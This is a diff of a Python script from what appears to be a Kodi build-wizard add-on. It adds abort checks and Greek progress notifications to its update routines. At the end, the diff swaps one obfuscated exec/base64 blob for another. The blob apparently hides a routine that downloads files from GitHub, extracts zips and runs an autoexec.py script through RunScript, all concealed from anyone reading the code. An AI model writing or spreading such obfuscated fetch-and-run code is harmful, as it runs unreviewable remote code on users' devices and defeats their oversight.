@@ -1,6 +1,6 @@
 ﻿# -*- coding: utf-8 -*-
-import xbmc, xbmcgui, xbmcvfs, xbmcaddon, os, hashlib, requests, shutil
-from resources.lib import extract, addoninstall, addonlinks
+import xbmc, xbmcgui, xbmcvfs, xbmcaddon, os, hashlib, requests, shutil, sys
+from resources.lib import extract, addoninstall, addonlinks, notify, monitor
 from contextlib import contextmanager
 addon = xbmcaddon.Addon()
 addonid = addon.getAddonInfo('id')
@@ -24,6 +24,7 @@ if not os.path.exists(BUILD_MD5S):
 dp = xbmcgui.DialogProgressBG()
 changelogfile = xbmcvfs.translatePath(os.path.join(addon.getAddonInfo('path'), 'changelog.txt'))
 changes = []
+
 def percentage(part, whole):
     return 100 * float(part)/float(whole)
 
@@ -49,9 +50,12 @@ def skinshortcuts():
         return
 
     start = 0
+    notify.progress('Ξεκινάει ο έλεγχος των συντομεύσεων')
     dp.create(addontitle, lang(30001))
-
     for item in files:
+        if monitor.waitForAbort(0.2):
+            dp.close()
+            sys.exit()
         start += 1
         perc = int(percentage(start, total))
         # if 'mainmenu' in item:
@@ -116,12 +120,13 @@ def skinshortcuts():
             except:
                 xbmcgui.Dialog().notification(addontitle, (lang(30002)+"...%s") % item, xbmcgui.NOTIFICATION_INFO, 1000, False)
                 continue
-        xbmc.sleep(200)
+        # xbmc.sleep(200)
 
     if len(changes) > 0:
         xbmcvfs.delete(skinhashpath)
     dp.close()
     addon.setSetting('shortcutsver', new_ver)
+    notify.progress('Η ενημέρωση των συντομεύσεων ολοκληρώθηκε')
     return True
 
 
@@ -135,7 +140,7 @@ def updatezip():
     if str(new_upd) == str(old_upd):
         xbmc.executebuiltin('UpdateAddonRepos()')
         return
-
+    notify.progress('Ξεκινάει ο έλεγχος των zip ενημέρωσης')
     updatezips = xbmcvfs.translatePath(os.path.join(addon.getAddonInfo('path'), 'resources', 'zips'))
     dirs, files = xbmcvfs.listdir(updatezips)
     totalfiles = len(files)
@@ -146,8 +151,9 @@ def updatezip():
         return
 
     zipchanges = []
-
     for item in files:
+        if monitor.waitForAbort(0.5):
+            sys.exit()
         if not item.endswith('.zip'):
             continue
         zippath = os.path.join(updatezips, item)
@@ -163,13 +169,15 @@ def updatezip():
         xbmcvfs.File(oldmd5file,"wb").write(newmd5)
         changes.append(item)
         zipchanges.append(item)
-        xbmc.sleep(1000)
+        # xbmc.sleep(1000)
         dp.close()
+
     if len(zipchanges) > 0 and len(addonslist) > 0:
         addoninstall.addonDatabase(addonslist, 1, True)
         xbmc.executebuiltin('UpdateLocalAddons()')
     xbmc.executebuiltin('UpdateAddonRepos()')
     addon.setSetting('updatesver', new_upd)
+    notify.progress('Η ενημέρωση μέσω των zip ολοκληρώθηκε')
 
     if len(changes) > 0:
         while (xbmc.getCondVisibility("Window.isVisible(yesnodialog)") or xbmc.getCondVisibility("Window.isVisible(okdialog)")):
@@ -193,13 +201,17 @@ def SFxmls():
 
     if str(new_upd) == str(old_upd):
         return
+    notify.progress('Ξεκινάει η ενημέρωση SFxmls')
     xmllinks = [('19548.DATA.xml', 'Sports'), ('29958.DATA.xml', 'Kids'), ('29969.DATA.xml', 'Documentaries'),
                 ('acestreams.DATA.xml', 'Acestreams'), ('a-i-o.DATA.xml', 'AllInOne'), ('ellenika.DATA.xml', 'Greek'),
                 ('movies.DATA.xml', 'Movies'), ('music.DATA.xml', 'Music'), ('radio.DATA.xml', 'Radio'),
                 ('replays.DATA.xml', 'Replays'), ('tvshows.DATA.xml', 'TV Shows'), ('worldtv.DATA.xml', 'WorldTV')]
     mainfolders = os.path.join(ADDONDATA, 'folders', 'Super Favourites')
     shortupdatedir = xbmcvfs.translatePath(os.path.join(addon.getAddonInfo('path'), 'resources', 'skinshortcuts'))
+
     for item in xmllinks:
+        if monitor.waitForAbort(0.5):
+            sys.exit()
         skin_xml = os.path.join(shortupdatedir, item[0])
         folder_xml = os.path.join(mainfolders, item[1])
         if not os.path.exists(folder_xml):
@@ -241,10 +253,13 @@ def SFxmls():
 
         # xbmcgui.Dialog().ok('SF XML CREATOR', 'NEW %s CREATED' % item[1])
     addon.setSetting('mainxmlsver', new_upd)
+    notify.progress('Η ενημέρωση των SFxmls ολοκληρώθηκε')
     return True
 
 def addon_remover():
     for removeid in removeaddonslist:
+        if monitor.waitForAbort(0.5):
+            sys.exit()
         try:
             addonfolderpath = os.path.join(HOME, 'addons', removeid)
             if os.path.exists(addonfolderpath):
@@ -258,7 +273,8 @@ def addon_remover():
     xbmc.executebuiltin('UpdateLocalAddons()')
     return True
 
-exec("import re;import base64");exec((lambda p,y:(lambda o,b,f:re.sub(o,b,f.decode('utf-8')))(r"([0-9a-f]+)",lambda m:p(m,y),base64.b64decode("MjQoImQgNWM7ZCA4ZiIpOzI0KCg5MSA4OSw5YzooOTEgOTksYixmOjVjLjdlKDk5LGIsZi42NCgnNDQtOCcpKSkoOTciKFswLTlhLWZdKykiLDkxIDhlOjg5KDhlLDljKSw4Zi4xOSgiOGI9PSIpKSkoOTEgYSxiOmJbMzEoIjg3IithLjQ2KDEpLDE2KV0sIjB8MXwyYXwxNHw0fDk4fDI2fDIyfDh8NmJ8MmN8OGF8M2Z8NWV8M2R8ZnwyZXwzN3w5Znw2fDFhfDhjfDE2fDIxfDFkfDcwfDQwfDgxfDZjfGV8OWR8Mjd8MjB8MTB8NTF8MTV8MmZ8MzN8MTh8MWJ8NWJ8MjV8MWZ8Njl8NDd8Nzh8MmJ8OTJ8MzB8OXwzMnwzZXw1ZnxjfDQzfGEwfDYzfDExfDQ1fDg4fDEzfDRkfDRlfDU1fDU5fDE3fDZlfDZmfDU2fDU3fDFjfDYwfDY3fDY4fDIzfDZhfDI5fDJkfDllfDNhfDlifDM0fDcxfDY0fDM1fDM2fDM5fDM4fDc3fDNifDNjfDkzfDQxfDQyfDk3fDgzfDQ5fDRifDRjfDFlfDRmfDUwfDUyfDRhfDUzfDU4fDVhfDhkfDVkfDY2fDYxfDk0fDY1fDk1fDk2fDYyfDZkfDczfDMxfDcyfDc2fDc1fDc0fDJ8Nzl8N2F8N2J8N2N8N2R8N2Z8ODB8NDR8ODJ8ODV8ODZ8NDh8ODR8Mjh8N3w5MHwzfDEyfDUiLjU0KCJ8IikpKQ==")))(lambda a,b:b[int("0x"+a.group(1),16)],"0|1|local_temp_filename|local_md5_filename|4|local_filename|remote_md5_url|allNoProgress|8|iter_content|a|b|start_script|import|status_code|f|chunk_size|percentage|remote_md5|addonlinks|addontitle|reporescue|16|gggbbbuuu|RunScript|b64decode|local_md5|totalurls|Finished|starturl|requests|autoexec|20|DOWNLOAD|continue|makedirs|exec|userdata|addonid|special|tmp_md5|extract|xbmcvfs|timeout|success|filemd5|folder|create|30|int|32|except|rsplit|verify|RENAME|delete|stream|append|ignore|encode|NEEDED|FAILED|DELETE|update|exists|github|return|giturl|utf|write|group|sleep|close|https|30007|30010|30011|codes|magic|ascii|False|30009|30008|30006|split|chunk|pass|2000|main|BUILD_MD5S|None|File|re|text|lang|home|join|URLS|perc|repo_rescue|decode|1024|HOME|else|True|urls|read|xbmc|path|zip|try|and|url|for|com|x04|def|raw|x03|md5|not|NOT|100|len|x4b|500|sub|MD5|ZIP|log|tmp|get|x50|85|86|0x|TO|p|translatePath|N2EgMjMoKToKCTJiID0gM2MuNmUKCTM2ID0gJzYwOi8vNWMuNzcvNDEvMjMvNzkvNjkvMzguNzQnCgkyYi41NigzNikKCTEwID0gNmQKCTQyOgoJCTE1IDJkIDJmLjFjLjFhKDIuYigxMCkpOgoJCQkyZi40YSgyLmIoMTApKQoJMjU6CgkJNDQKCTI3ID0gN2UoMmIpCgkxOCA9IDAKCTFlLjI0KDMsIGQoNjgpKQoJNTIgMTkgNmIgMmI6CgkJMTggKz0gMQoJCTczID0gNzYoMzkoMTgsIDI3KSkKCQk1ID0gMTkuNTEoJy8nLCAxKVstMV0KCQkxNSAyZCA1OgoJCQk3CgkJOGUgPSAyZi4xYy40NygxMCwgNSkKCQk3YiA9IDhlICsgIi44NCIKCQk4YyA9IDJmLjFjLjQ3KDQwLCAoNSArICIuNTgiKSkKCQkxMyA9IDE5ICsgIi41OCIKCgkJMTQgPSAyLjI4KDhjLCI3MSIpLjRiKClbOjMyXQoJCThkID0gNmEKCQk0MjoKCQkJNWUgPSA2My41ZigxMywgMmU9MjApCgkJCTE1IDVlLjFkID09IDYzLjNkLjZmOgoJCQkJOGQgPSA1ZS42Yy41OSgnNjQnLCAnNGYnKVs6MzJdLjUzKCc4My04JykKCQkyNToKCQkJNDQKCgkJMTUgMTQgNDMgOGQgNDMgMTQgPT0gOGQ6CgkJCTkuMWIoKCJbJTM3XSAxNyA3YyA1YTogIiAlIDYpICsgMTkpCgkJCTcKCQlmID0gMi4yOCg3YiwiNzIiKQoJCTFlLmMoNzMsIDMsIChkKDY3KSsiLi4uJTM3IikgJSA1KQoJCTQyOgoJCQk1ZSA9IDYzLjVmKDE5LCA1Nz00OSwgNTQ9NjUsIDJlPTMwKQoJCQkxNSA1ZS4xZCA9PSA2My4zZC42ZjoKCQkJCTIxID0gMTYgKiA3MAoJCQkJNTIgM2YgNmIgNWUuMzEoMjEpOgoJCQkJCWEgPSBmLjNhKDNmKQoJCQkJZi44NygpCgkJCTQ4OgoJCQkJOS4xYigoIlslMzddIGUgM2IgMTc6ICIgJSA2KSArIDE5KQoJCQkJZi44NygpCgkJCQkyLjExKDdiKQoJCQkJNwoJCTI1OgoJCQk5LjFiKCgiWyUzN10gZSAzYiAxNzogIiAlIDYpICsgMTkpCgkJCWYuODcoKQoJCQkyLjExKDdiKQoJCQk3CgkJODkgPSA0ZCg3YikKCgkJMTUgOGQgNDMgODkgIT0gOGQ6CgkJCTkuMWIoKCJbJTM3XSBlIDgxOiAiICUgNikgKyAxOSkKCQkJNwoKCQkxNSAyZi4xYy4xYSg4ZSk6CgkJCWEgPSAyLjExKDhlKQoJCQkxNSAyZCBhOgoJCQkJOS4xYigoIlslMzddIGUgM2IgMzM6ICIgJSA2KSArIDhlKQoJCQkJNwoKCQlhID0gMi41MCg3Yiw4ZSkKCQkxNSAyZCBhOgoJCQk5LjFiKCgiWyUzN10gZSAzYiA1NTogIiAlIDYpICsgOGUpCgkJCTIuMTEoN2IpCgkJCTcKCgkJMi4yOCg4YywiNzIiKS4zYSg4OSkKCQkzZSA9IDIuMjgoOGUsIjcxIikuNGIoNCkKCQkxNSAzZSA9PSAiXDg4XDdmXDc4XDc1IjoKCQkJNGMuOGEoOGUsIDEwKQoJCQkxZS5jKDczLCAzLCAoIiUzNy4uLiIrZCg2NikpICUgNSkKCQkJOS4yYyg4MCkKCQkJMTUgMmYuMWMuMWEoOGUpOgoJCQkJYSA9IDIuMTEoOGUpCgkJCQkxNSAyZCBhOgoJCQkJCTkuMWIoKCJbJTM3XSBlIDNiIDMzIDgyOiAiICUgNikgKyA4ZSkKCQk5LjFiKCJbJTM3XSA0NiAlMzciICUgKDYsIDUpKQoJMWUuODcoKQoKCTE1IDJmLjFjLjFhKDIuYignMWY6Ly8zNC8yOS8yYS41YicpKToKCQkxZS4yNCgzLCBkKDIyKSkKCQkxZS5jKDg1LCAzLCBkKDIyKSkKCQk5LjEyKCcyNigxZjovLzM0LzI5LzJhLjViKScpCgkJMWUuYyg4NiwgMywgZCgyMikpCgk0ODoKCQkxZS4yNCgzLCBkKDIyKSkKCQkxZS5jKDhiLCAzLCBkKDYxKSkKCQkjIDkuMTIoJzI2KDFmOi8vMzQvNGUvJTM3LzM1LjViKScpCgkJOS4yYyg0NSkKCQkxZS5jKDdkLCAzLCBkKDYyKSkKCTkuMmMoNDUpCgkxZS44NygpCgk1ZCA0OQ|if|in|m|base64|90|lambda|os|py|ok|rb|wb|r|filename|o|9a|rename|y|dp|addons|executebuiltin|s".split("|")))
+
+exec("import re;import base64");exec((lambda p,y:(lambda o,b,f:re.sub(o,b,f.decode('utf-8')))(r"([0-9a-f]+)",lambda m:p(m,y),base64.b64decode("MjEoImQgNmE7ZCBjIik7MjEoKDk0IDlkLDk2Oig5NCA4YSxiLGY6NmEuNmYoOGEsYixmLjYzKCc0Ni04JykpKSg5MiIoWzAtOWEtZl0rKSIsOTQgOTg6OWQoOTgsOTYpLGMuMWEoIjliPSIpKSkoOTQgYSxiOmJbMzAoIjhkIithLjUyKDEpLDE2KV0sIjB8MXwyZnwyNnw0fDV8MmR8M3w4fDI1fDVjfDd8NTl8OTl8Mzh8ZnwxMHw5Y3w0MXw4ZXw2NXw2fDE2fDMzfDVlfDc4fDcxfDFmfDI0fGV8Mjl8MmN8MjB8MTN8MTR8Mzl8MWJ8MWN8MWV8Njh8NmJ8NzR8Mjd8Mjh8OTB8OWZ8OWV8OTV8OXw1ZnwzMnwzY3wzZHw2OXw2Mnw0N3w5M3w0YXw0Ynw0Y3wxMXw1MHw1M3w1NHw5N3wxNXwxN3w3ZnwxOHw3N3w4Nnw1ZHw4Y3w2MHw2MXw2NHw4YnwxZHw2ZHwyYXwyYnwzMXwzNHwzZXwzN3w2M3w5Mnw3YXwzYnw3Y3wzNXw4MXwzZnw0MHw0Mnw0M3w0NHw0NXw0OHw0OXw0ZXw0Znw1MXwzYXw1Nnw1N3w1OHw4N3w1YXw1YnwzNnw5MXw4Znw2Nnw2N3w4OXxhMHw2Y3w4OHw2ZXwzMHw3Nnw3Mnw3M3w3NXw3MHw3OXwyMnw3YnwyfDgzfDdkfDdlfDgwfDgyfDg0fDg1fDQ2fDRkfDE5fDIzfDJlfDEyIi41NSgifCIpKSk=")))(lambda a,b:b[int("0x"+a.group(1),16)],"0|1|local_temp_filename|local_md5_filename|4|5|remote_md5_url|translatePath|8|iter_content|a|b|base64|import|status_code|f|10|addonlinks|remote_md5|chunk_size|reporescue|BUILD_MD5S|16|gggbbbuuu|RunScript|local_md5|b64decode|totalurls|autoexec|makedirs|userdata|DOWNLOAD|20|exec|continue|requests|starturl|progress|filename|timeout|special|tmp_md5|extract|filemd5|monitor|addonid|success|xbmcvfs|int|create|32|exists|append|rename|giturl|encode|notify|except|FAILED|github|update|DELETE|RENAME|rsplit|verify|delete|return|stream|NEEDED|ignore|utf|write|sleep|30009|30008|30007|30006|close|30010|30011|magic|https|group|codes|chunk|split|ascii|False|URLS|lang|1024|None|xbmc|True|path|exit|home|join|repo_rescue|decode|read|addontitle|HOME|else|urls|perc|re|File|main|pass|text|sub|def|log|tmp|x4b|not|x50|zip|and|url|ZIP|md5|500|for|NOT|MD5|sys|raw|get|com|len|x04|x03|try|wb|in|rb|o|Finished|dp|0x|folder|py|os|ok|r|percentage|lambda|allNoProgress|y|TO|m|waitForAbort|9a|N2QgMjIoKToKCTI3ID0gM2MuNmEKCTZlID0gJzY2Oi8vNTguODYvNDIvMjIvODUvNzUvMzYuNzknCgkyNy41Mig2ZSkKCTEzID0gNzEKCTQ2OgoJCTExIDI5IDJjLjE4LjE3KDIuYigxMykpOgoJCQkyYy40ZCgyLmIoMTMpKQoJMjM6CgkJNGUKCTI0ID0gODIoMjcpCgkxYyA9IDAKCWUuOShjKDNiKSkKCSMgNDguNTEoMTQsIGMoM2IpKQoJNTkgMTkgNzYgMjc6CgkJMTEgMWYuZCgwLjUpOgoJCQk0My4zMSgpCgkJMWMgKz0gMQoJCTM1ID0gNzgoMzgoMWMsIDI0KSkKCQkzID0gMTkuNWMoJy8nLCAxKVstMV0KCQkxMSAyOSAzOgoJCQk3ZgoJCTc0ID0gMmMuMTguNGEoMTMsIDMpCgkJODEgPSA3NCArICIuN2EiCgkJNyA9IDJjLjE4LjRhKDQxLCAoMyArICIuNTciKSkKCQkxNSA9IDE5ICsgIi41NyIKCgkJOGIgPSAyLjI4KDcsIjczIikuNGIoKVs6MzJdCgkJOGUgPSA2ZAoJCTQ2OgoJCQk1NiA9IDhjLjViKDE1LCAyYT0xMCkKCQkJMTEgNTYuMWQgPT0gOGMuM2UuNmY6CgkJCQk4ZSA9IDU2Ljc3LjU0KCc2OCcsICc2MScpWzozMl0uNTUoJzg5LTgnKQoJCTIzOgoJCQk0ZQoKCQkxMSA4YiA0NSA4ZSA0NSA4YiA9PSA4ZToKCQkJYS4xYSgoIlslMmVdIDFiIDgzIDYwOiAiICUgNikgKyAxOSkKCQkJN2YKCQlmID0gMi4yOCg4MSwiNmIiKQoJCWUuOSgoYygzYSkrIi4uLiUyZSIpICUgMykKCQkjIDQ4LjMzKDM1LCAxNCwgKGMoM2EpKyIuLi4lMmUiKSAlIDMpCgkJNDY6CgkJCTU2ID0gOGMuNWIoMTksIDVmPTQ3LCA1ZD02OSwgMmE9MjApCgkJCTExIDU2LjFkID09IDhjLjNlLjZmOgoJCQkJMjEgPSAxNiAqIDZjCgkJCQk1OSAzZiA3NiA1Ni4zMCgyMSk6CgkJCQkJOGQgPSBmLjM3KDNmKQoJCQkJZi44YSgpCgkJCTcyOgoJCQkJYS4xYSgoIlslMmVdIDY3IDQwIDFiOiAiICUgNikgKyAxOSkKCQkJCWYuOGEoKQoJCQkJMi4xMig4MSkKCQkJCTdmCgkJMjM6CgkJCWEuMWEoKCJbJTJlXSA2NyA0MCAxYjogIiAlIDYpICsgMTkpCgkJCWYuOGEoKQoJCQkyLjEyKDgxKQoJCQk3ZgoJCTFlID0gNTAoODEpCgoJCTExIDhlIDQ1IDFlICE9IDhlOgoJCQlhLjFhKCgiWyUyZV0gNjcgODQ6ICIgJSA2KSArIDE5KQoJCQk3ZgoKCQkxMSAyYy4xOC4xNyg3NCk6CgkJCThkID0gMi4xMig3NCkKCQkJMTEgMjkgOGQ6CgkJCQlhLjFhKCgiWyUyZV0gNjcgNDAgMzQ6ICIgJSA2KSArIDc0KQoJCQkJN2YKCgkJOGQgPSAyLjVhKDgxLDc0KQoJCTExIDI5IDhkOgoJCQlhLjFhKCgiWyUyZV0gNjcgNDAgNTM6ICIgJSA2KSArIDc0KQoJCQkyLjEyKDgxKQoJCQk3ZgoKCQkyLjI4KDcsIjZiIikuMzcoMWUpCgkJM2QgPSAyLjI4KDc0LCI3MyIpLjRiKDQpCgkJMTEgM2QgPT0gIlw3Y1w3Ylw4OFw4NyI6CgkJCTRmLjJmKDc0LCAxMykKCQkJZS45KCgiJTJlLi4uIitjKDM5KSkgJSAzKQoJCQkjIDQ4LjMzKDM1LCAxNCwgKCIlMmUuLi4iK2MoMzkpKSAlIDMpCgkJCSMgYS42Mig4MCkKCQkJMTEgMmMuMTguMTcoNzQpOgoJCQkJOGQgPSAyLjEyKDc0KQoJCQkJMTEgMjkgOGQ6CgkJCQkJYS4xYSgoIlslMmVdIDY3IDQwIDM0IDdlOiAiICUgNikgKyA3NCkKCQlhLjFhKCJbJTJlXSA0YyAlMmUiICUgKDYsIDMpKQoJIyA0OC44YSgpCgllLjkoYyg2MykpCgllLjkoYyg2NCkpCgkKCTExIDJjLjE4LjE3KDIuYignMmI6Ly80OS8yNi8yNS43MCcpKToKCQkxMSAxZi5kKDAuNSk6CgkJCTQzLjMxKCkKCQlhLjJkKCc0NCgyYjovLzQ5LzI2LzI1LjcwKScpCgkxMSAxZi5kKDAuNSk6CgkJNDMuMzEoKQoJZS45KGMoNjUpKQoJNWUgNDc|if|p|s|executebuiltin|local_filename".split("|")))
 
 def textViewer(file, heading=addontitle, monofont=True):
     xbmc.sleep(200)
